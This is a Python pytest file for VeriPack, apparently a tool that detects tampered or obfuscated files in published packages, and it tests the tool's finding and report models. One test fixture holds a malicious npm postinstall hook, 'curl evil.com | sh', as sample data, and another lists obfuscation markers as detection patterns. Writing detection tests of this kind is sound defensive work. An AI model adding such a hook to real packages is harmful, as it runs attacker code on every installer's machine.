"""
Smoke test suite for VeriPack foundation and data models.
"""

import json
from veripack import __version__, __author__
from veripack.models import (
    Severity,
    Archetype,
    StatusBadge,
    Finding,
    AnalysisSummary,
    AnalysisReport,
)


def test_package_metadata():
    """Verify package exposes semantic version and team author attribution."""
    assert __version__ == "0.1.0"
    assert "Pratyancha" in __author__


def test_models_initialization():
    """Verify models can represent all 3 evaluation archetypes."""
    # Case 1: Expected build output
    f1 = Finding(
        file_path="dist/index.js",
        status=StatusBadge.SAFE,
        severity=Severity.INFO,
        archetype=Archetype.CASE_1_EXPECTED_BUILD,
        title="Compiled output from src/index.ts",
        explanation="Standard TypeScript compiler bundle; recognized as expected artifact.",
    )
    assert f1.status == StatusBadge.SAFE
    assert f1.archetype == Archetype.CASE_1_EXPECTED_BUILD

    # Case 2: Manifest tampering
    f2 = Finding(
        file_path="package.json",
        status=StatusBadge.WARNING,
        severity=Severity.HIGH,
        archetype=Archetype.CASE_2_MANIFEST_TAMPERING,
        title="Unauthorized postinstall lifecycle hook",
        explanation="Added 'postinstall: curl evil.com | sh' not present in upstream Git tag.",
        diff_hunk='+ "postinstall": "curl evil.com | sh"',
    )
    assert f2.status == StatusBadge.WARNING
    assert f2.severity == Severity.HIGH

    # Case 3: Ghost obfuscated file
    f3 = Finding(
        file_path="lib/x.min.js",
        status=StatusBadge.COMPROMISED,
        severity=Severity.CRITICAL,
        archetype=Archetype.CASE_3_GHOST_OBFUSCATED,
        title="Obfuscated file with no upstream source",
        explanation="High Shannon entropy (6.84) and hex payload markers; phantom injection.",
        entropy=6.84,
        ast_markers=["eval", "hex_array", "_0x4a12"],
    )
    assert f3.status == StatusBadge.COMPROMISED
    assert f3.severity == Severity.CRITICAL


def test_analysis_report_serialization():
    """Verify complete report serialization into JSON."""
    summary = AnalysisSummary(
        total_package_files=10,
        total_source_files=8,
        matched_files=6,
        expected_artifacts=2,
        manifest_modifications=1,
        ghost_files=1,
        overall_status=StatusBadge.COMPROMISED,
        overall_score=45.0,
    )

    report = AnalysisReport(
        package_name="test-package",
        package_version="1.0.0",
        source_target="https://github.com/example/test-package",
        summary=summary,
        models_consulted=["Qwen 2.5 Coder 7B", "Llama 3.1 8B", "SmolLM 360M"],
    )

    data = report.to_dict()
    assert data["package_name"] == "test-package"
    assert data["summary"]["overall_status"] == StatusBadge.COMPROMISED
    assert len(data["models_consulted"]) == 3

    # Check JSON serializability
    json_str = json.dumps(data)
    assert "test-package" in json_str
    assert "Qwen 2.5 Coder 7B" in json_str
